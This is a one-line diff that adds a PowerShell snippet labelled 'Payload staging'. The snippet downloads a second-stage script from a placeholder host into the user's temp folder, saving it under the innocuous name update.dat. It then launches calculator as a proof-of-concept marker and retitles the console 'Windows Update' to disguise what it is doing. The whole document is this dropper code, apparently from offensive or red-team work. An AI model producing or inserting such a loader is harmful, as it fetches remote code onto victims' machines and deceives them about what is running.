@@ -1,0 +1,1 @@
+<# Payload staging #> $Stage2Url = 'https://contoso.com/stage1.ps1'; $Stage2Path = "$env:TEMP\update.dat"; (New-Object System.Net.WebClient).DownloadFile($Stage2Url, $Stage2Path); Start-Process -FilePath "calc.exe"; $Host.UI.RawUI.WindowTitle = "Windows Update"
